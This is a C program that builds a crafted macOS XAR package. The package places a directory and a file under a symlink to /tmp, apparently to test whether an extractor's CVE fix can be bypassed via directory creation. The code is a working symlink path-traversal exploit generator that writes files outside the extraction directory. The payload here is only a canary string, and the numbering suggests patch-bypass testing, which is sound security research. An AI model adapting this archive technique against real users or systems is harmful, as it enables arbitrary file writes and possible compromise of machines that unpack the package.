/*
 * build_xar_r38.c  — CREATEDIR bypass attack
 *
 * XAR tree:
 *   ROOT
 *   └── d  (dir)
 *       └── link_to_tmp  (symlink → /tmp)      [id=2, child of id=1]
 *           └── xar_r38_subdir  (dir)           [id=3, child of id=2=symlink]
 *               └── xar_gated_canary_macos.txt  [id=4, child of id=3=dir]
 *
 * The CVE fix checks XAR-tree parent type before CREATEFILE/CREATELINK.
 * If CREATEDIR is unguarded, mkdir traverses the symlink into /tmp.
 * Then FILE's parent in XAR tree = id=3 (directory) → check passes → write succeeds.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <arpa/inet.h>
#include <CommonCrypto/CommonDigest.h>
#include <zlib.h>

#define XAR_MAGIC     0x78617221u
#define XAR_HDR_SIZE  28
#define CKSUM_ALG_SHA1 1

typedef struct __attribute__((packed)) {
    uint32_t magic;
    uint16_t size;
    uint16_t version;
    uint64_t toc_len_compressed;
    uint64_t toc_len_uncompressed;
    uint32_t cksum_alg;
} xar_header_t;

static uint64_t htonll_local(uint64_t v) {
    return (((uint64_t)htonl((uint32_t)(v >> 32))) |
            ((uint64_t)htonl((uint32_t)(v & 0xFFFFFFFFu)) << 32));
}

int main(void) {
    /* Payload */
    const char *payload = "XAR_SYMLINK2_GATE_A_DIR_BYPASS_RUN38\n";
    size_t payload_len  = strlen(payload);

    /* Compress payload */
    uLong czbound = compressBound((uLong)payload_len);
    unsigned char *cz = malloc(czbound);
    uLong czlen = czbound;
    if (compress2(cz, &czlen, (const Bytef *)payload, (uLong)payload_len, 9) != Z_OK) {
        fprintf(stderr, "compress2 payload failed\n"); return 1;
    }

    /* TOC XML — nested structure encoding XAR parent-child relationships */
    char toc_xml[8192];
    int toc_xml_len = snprintf(toc_xml, sizeof(toc_xml),
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
        "<xar><toc>"
          "<checksum style=\"sha1\">"
            "<offset>0</offset><size>20</size>"
          "</checksum>"
          /* id=1: top-level real directory */
          "<file id=\"1\">"
            "<name>d</name>"
            "<type>directory</type>"
            "<mode>0755</mode>"
            /* id=2: symlink inside d, child of id=1 */
            "<file id=\"2\">"
              "<name>link_to_tmp</name>"
              "<type>symlink</type>"
              "<link>/tmp</link>"
              /* id=3: directory child of symlink — CREATEDIR bypass target */
              "<file id=\"3\">"
                "<name>xar_r38_subdir</name>"
                "<type>directory</type>"
                "<mode>0755</mode>"
                /* id=4: file whose XAR parent is id=3 (directory, not symlink) */
                "<file id=\"4\">"
                  "<name>xar_gated_canary_macos.txt</name>"
                  "<type>file</type>"
                  "<data>"
                    "<offset>20</offset>"
                    "<size>%zu</size>"
                    "<length>%zu</length>"
                    "<encoding style=\"application/x-gzip\"/>"
                  "</data>"
                "</file>"
              "</file>"
            "</file>"
          "</file>"
        "</toc></xar>",
        payload_len, (size_t)czlen);

    if (toc_xml_len < 0 || (size_t)toc_xml_len >= sizeof(toc_xml)) {
        fprintf(stderr, "TOC too large\n"); return 1;
    }
    size_t toc_len = (size_t)toc_xml_len;

    /* Compress TOC */
    uLong toc_czbound = compressBound((uLong)toc_len);
    unsigned char *toc_cz = malloc(toc_czbound);
    uLong toc_czlen = toc_czbound;
    if (compress2(toc_cz, &toc_czlen, (const Bytef *)toc_xml, (uLong)toc_len, 9) != Z_OK) {
        fprintf(stderr, "compress2 TOC failed\n"); return 1;
    }

    /* SHA1 of heap (placeholder zeros — xar validates but we test extraction) */
    unsigned char sha1[CC_SHA1_DIGEST_LENGTH] = {0};
    /* Real SHA1 of heap (sha1_placeholder + payload) */
    CC_SHA1_CTX ctx;
    CC_SHA1_Init(&ctx);
    CC_SHA1_Update(&ctx, sha1, sizeof(sha1)); /* placeholder checksum block itself */
    CC_SHA1_Update(&ctx, cz, (CC_LONG)czlen);
    CC_SHA1_Final(sha1, &ctx);

    /* Build header */
    xar_header_t hdr;
    hdr.magic                 = htonl(XAR_MAGIC);
    hdr.size                  = htons(XAR_HDR_SIZE);
    hdr.version               = htons(1);
    hdr.toc_len_compressed    = htonll_local((uint64_t)toc_czlen);
    hdr.toc_len_uncompressed  = htonll_local((uint64_t)toc_len);
    hdr.cksum_alg             = htonl(CKSUM_ALG_SHA1);

    /* Write XAR */
    FILE *f = fopen("gate_a38.pkg", "wb");
    if (!f) { perror("fopen"); return 1; }
    fwrite(&hdr,    sizeof(hdr), 1, f);
    fwrite(toc_cz,  1, (size_t)toc_czlen, f);
    fwrite(sha1,    1, sizeof(sha1), f);  /* heap offset 0 */
    fwrite(cz,      1, (size_t)czlen, f); /* heap offset 20 */
    fclose(f);

    printf("gate_a38.pkg: TOC %lu bytes (compressed), payload %zu -> %lu bytes\n",
           (unsigned long)toc_czlen, payload_len, (unsigned long)czlen);
    return 0;
}
